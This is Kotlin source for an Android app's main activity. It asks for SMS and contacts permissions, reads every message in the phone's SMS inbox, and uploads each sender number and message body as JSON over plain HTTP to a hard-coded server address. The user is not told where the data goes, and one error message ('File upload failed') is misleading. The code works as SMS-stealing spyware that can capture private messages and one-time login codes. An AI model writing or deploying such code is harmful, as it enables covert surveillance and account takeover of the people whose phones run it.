package com.myapp.myapplication

import android.Manifest
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Bundle
import android.provider.ContactsContract
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import android.os.Environment
import okhttp3.*
import java.io.File
import java.io.FileWriter
import java.io.IOException
import okhttp3.MediaType.Companion.toMediaTypeOrNull

data class TextMessage(val sender: String, val phoneNumber: String, val message: String)

class MainActivity : AppCompatActivity() {
    private var smsTextView: TextView? = null
    private val client = OkHttpClient()

    private val requestSmsPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { isGranted: Boolean ->
        if (isGranted) {
            requestContactsPermission()
        } else {
            Toast.makeText(this, "SMS permission denied", Toast.LENGTH_SHORT).show()
        }
    }

    private val requestContactsPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { isGranted: Boolean ->
        if (isGranted) {
            readSmsAndSendToServer()
        } else {
            Toast.makeText(this@MainActivity, "File upload failed", Toast.LENGTH_SHORT).show()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        smsTextView = findViewById(R.id.sms_text_view)
        checkSmsPermission()
    }

    private fun checkSmsPermission() {
        val smsPermission = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.READ_SMS
        )

        if (smsPermission == PackageManager.PERMISSION_GRANTED) {
            requestContactsPermission()
        } else {
            requestSmsPermissionLauncher.launch(Manifest.permission.READ_SMS)
        }
    }

    private fun requestContactsPermission() {
        val contactsPermission = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.READ_CONTACTS
        )

        if (contactsPermission == PackageManager.PERMISSION_GRANTED) {
            readSmsAndSendToServer()
        } else {
            Toast.makeText(this@MainActivity, "File upload failed", Toast.LENGTH_SHORT).show()
        }
    }

    private fun getContactName(phoneNumber: String): String {
        val uri: Uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phoneNumber))
        val cursor = contentResolver.query(
            uri,
            arrayOf(ContactsContract.PhoneLookup.DISPLAY_NAME),
            null,
            null,
            null
        )

        return cursor?.use { cursor ->
            if (cursor.moveToFirst()) {
                val columnIndex = cursor.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME)
                if (columnIndex >= 0) {
                    cursor.getString(columnIndex) ?: "Unknown"
                } else {
                    "Unknown"
                }
            } else {
                "Unknown"
            }
        } ?: "Unknown"
    }

    private fun readSmsAndSendToServer() {
        val url = "http://192.168.35.43:8080/upload" // Replace with your server's URL
        val messages = mutableListOf<TextMessage>()

        val uri = Uri.parse("content://sms/inbox")
        val cursor = contentResolver.query(uri, null, null, null, null)

        cursor?.use { cursor ->
            if (cursor.moveToFirst()) {
                val phoneNumberIndex = cursor.getColumnIndex("address")
                val messageIndex = cursor.getColumnIndex("body")

                do {
                    val phoneNumber = cursor.getString(phoneNumberIndex) ?: "Unknown"
                    val message = cursor.getString(messageIndex) ?: ""

                    val textMessage = TextMessage("Your App Name", phoneNumber, message)
                    messages.add(textMessage)
                } while (cursor.moveToNext())

                // Send each message to the server
                messages.forEach { textMessage ->
                    val json = """
                        {
                            "sender": "${textMessage.sender}",
                            "phoneNumber": "${textMessage.phoneNumber}",
                            "message": "${textMessage.message}"
                        }
                    """

                    val body = RequestBody.create("application/json; charset=utf-8".toMediaTypeOrNull(), json)
                    val request = Request.Builder()
                        .url(url)
                        .post(body)
                        .build()

                    client.newCall(request).enqueue(object : Callback {
                        override fun onFailure(call: Call, e: IOException) {
                            runOnUiThread {
                                Toast.makeText(this@MainActivity, "Message send failed", Toast.LENGTH_SHORT).show()
                            }
                        }

                        override fun onResponse(call: Call, response: Response) {
                            if (response.isSuccessful) {
                                runOnUiThread {
                                    Toast.makeText(this@MainActivity, "Message sent successfully", Toast.LENGTH_SHORT).show()
                                }
                            } else {
                                val responseCode = response.code
                                runOnUiThread {
                                    Toast.makeText(this@MainActivity, "Message send failed: $responseCode", Toast.LENGTH_SHORT).show()
                                }
                            }
                        }
                    })
                }
            } else {
                runOnUiThread {
                    Toast.makeText(this@MainActivity, "No SMS messages found", Toast.LENGTH_SHORT).show()
                }
            }
        }
    }
}
